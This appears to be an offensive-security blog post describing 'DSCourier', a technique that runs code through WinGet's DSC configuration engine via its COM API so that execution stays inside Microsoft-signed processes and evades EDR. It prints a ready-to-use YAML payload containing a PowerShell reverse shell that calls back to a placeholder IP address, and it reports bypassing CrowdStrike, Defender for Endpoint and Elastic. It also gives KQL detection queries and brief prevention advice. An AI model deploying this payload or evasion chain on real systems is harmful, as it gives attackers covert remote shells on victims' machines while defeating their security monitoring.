---
layout: post
title: "DSCourier: Weaponizing DSC via WinGet COM API for EDR Evasive Execution"
date: 2026-04-16
permalink: /DSCourier/
categories: research offensive-security windows
tags: [winget, dsc, evasion, redteam]
image: /assets/img/DSCourier/DSCourier.png
---

## Table of Contents

- [Introduction](#introduction)
- [What is WinGet?](#what-is-winget)
- [WinGet as a PowerShell Execution Proxy](#winget-as-a-powershell-execution-proxy)
- [Limitations of Using winget.exe Directly](#limitations-of-using-wingetexe-directly)
- [Building YAML Payloads](#building-yaml-payloads)
- [Removing winget.exe from the Equation](#removing-wingetexe-from-the-equation)
- [Process Tree Comparison](#process-tree-comparison)
- [Bypassing EDR Solutions](#bypassing-edr-solutions)
  - [CrowdStrike Falcon](#crowdstrike-falcon)
  - [Microsoft Defender for Endpoint (MDE)](#microsoft-defender-for-endpoint-mde)
  - [Elastic Security EDR](#elastic-security-edr)
- [Detections](#detections)
- [Preventions](#preventions)
- [Conclusion](#conclusion)
- [Source Code](#source-code)

---

## Introduction

The abuse of Windows Package Manager (WinGet) as a living-off-the-land binary is not a new concept. Prior research, such as [Zero Salarium's work](https://www.zerosalarium.com/2024/12/LOLBIN%20WinGet%20execute%20PowerShell%20script.html), demonstrated that `winget.exe` can serve as a proxy for PowerShell execution through its `configure` subcommand.

This post takes that concept further. Instead of calling `winget.exe`, we invoke the WinGet Configuration engine directly through its **COM API**, completely removing the CLI process from the execution chain. The result is arbitrary code execution inside a Microsoft-signed process with no `winget.exe`, no `powershell.exe`, and no `cmd.exe` in the process tree.

---

## What is WinGet?

[WinGet](https://learn.microsoft.com/en-us/windows/package-manager/winget/) is Microsoft's official package manager for Windows.

Think of `apt` on Debian or `brew` on macOS—it lets you install and manage software from the terminal.

What makes WinGet relevant here is its availability. It ships natively with modern Windows systems and includes a **configure** subcommand that applies DSC configurations from YAML files.

---

## WinGet as a PowerShell Execution Proxy

WinGet’s configure command accepts YAML files that define DSC resources.

One of these, `PSDscResources/Script`, allows arbitrary PowerShell execution. This does **not** run through `powershell.exe`, but instead through:

```
ConfigurationRemotingServer.exe
```

This creates a potential detection blind spot.

---

## Limitations of Using winget.exe Directly

### Process Creation Logging

`winget.exe` appears in logs with full command-line arguments:

```kql
process.name: "winget.exe" and process.command_line: (*configure* or *configuration* or *dsc*)
```

![winget detection](/assets/img/DSCourier/Image1.png)

### Parent Process Visibility

Typical process tree:

```
cmd.exe
 └── winget.exe
       └── ConfigurationRemotingServer.exe
```

This provides full traceability.

---

## Building YAML Payloads

Example DSC configuration:

```yaml
properties:
  configurationVersion: 0.2.0
  resources:
    - resource: PSDscResources/Script
      id: env-health-check
      directives:
        description: Simple Reverse Shell Example
        allowPrerelease: true
      settings:
        GetScript: |
          @{ Result = "OK" }
        SetScript: |
          $client = [System.Net.Sockets.TcpClient]::new()
          $client.Connect('IP_ADDRESS', 443)
          $stream = $client.GetStream()
          $writer = [System.IO.StreamWriter]::new($stream)
          $reader = [System.IO.StreamReader]::new($stream)
          $writer.AutoFlush = $true
          while ($true) {
              $cmd = $reader.ReadLine()
              if ($cmd -eq 'exit') { break }
              $output = Invoke-Expression $cmd 2>&1 | Out-String
              $writer.WriteLine($output)
          }
          $client.Close()
        TestScript: |
          $false
```

---

## Removing winget.exe from the Equation

Instead of using CLI, we call the **WinGet COM API**.

Key components:

- `Microsoft.Management.Configuration`
- `WindowsPackageManagerServer.exe`

No `winget.exe` required.

---

## Process Tree Comparison

### Traditional Approach

```
cmd.exe
 └── winget.exe
       └── ConfigurationRemotingServer.exe
```

### COM API Approach

```
svchost.exe (DCOMLaunch)
 └── WindowsPackageManagerServer.exe
       └── ConfigurationRemotingServer.exe
```

![process tree](/assets/img/DSCourier/Image2.png)

---

## Bypassing EDR Solutions

Because the COM-based approach avoids spawning `winget.exe` and executes entirely within Microsoft-signed processes, it slips past several enterprise EDR solutions that rely on process tree heuristics and known-binary telemetry.

### CrowdStrike Falcon

DSCourier was tested against a live CrowdStrike Falcon deployment. The payload executed successfully without triggering any prevention or detection. Falcon's process-based telemetry did not flag `WindowsPackageManagerServer.exe` or `ConfigurationRemotingServer.exe` as malicious, and the reverse shell was able to call back.

<video controls width="100%">
  <source src="/assets/videos/CrowdStrike_Bypass.mp4" type="video/mp4">
</video>

### Microsoft Defender for Endpoint (MDE)

The same technique bypasses **Microsoft Defender for Endpoint**. MDE's default detection rules focus on well-known execution proxies and LOLBins—`WindowsPackageManagerServer.exe` initiating DSC configuration processing does not match existing behavioral signatures, allowing the payload to execute undetected.

### Elastic Security EDR

**Elastic Security EDR** was also bypassed during our testing. Elastic's detection rules for PowerShell and script-based execution are typically bound to `powershell.exe`, `cmd.exe`, and similar interpreters. The COM API approach sidesteps these entirely, as execution originates from `svchost.exe` → `WindowsPackageManagerServer.exe` → `ConfigurationRemotingServer.exe`, a chain that does not trigger default Elastic rules.

---

## Detections

Monitor for:

- `WindowsPackageManagerServer.exe`
- `ConfigurationRemotingServer.exe`

```kql
event.category:process and event.type:start and
process.parent.name:("ConfigurationRemotingServer.exe" or "WindowsPackageManagerServer.exe") and
process.name:("powershell.exe" or "cmd.exe" or "wscript.exe" or "cscript.exe")
```

![detection](/assets/img/DSCourier/image3.png)

---

## Preventions

Disable WinGet via GPO and restrict configuration features.

---

## Conclusion

By invoking DSC through COM instead of CLI, we achieve execution inside Microsoft-signed binaries without `winget.exe`.

Detection must shift from process-based monitoring to behavior-based monitoring.

---

## Source Code

[DSCourier on GitHub](https://github.com/DylanDavis1/DSCourier)
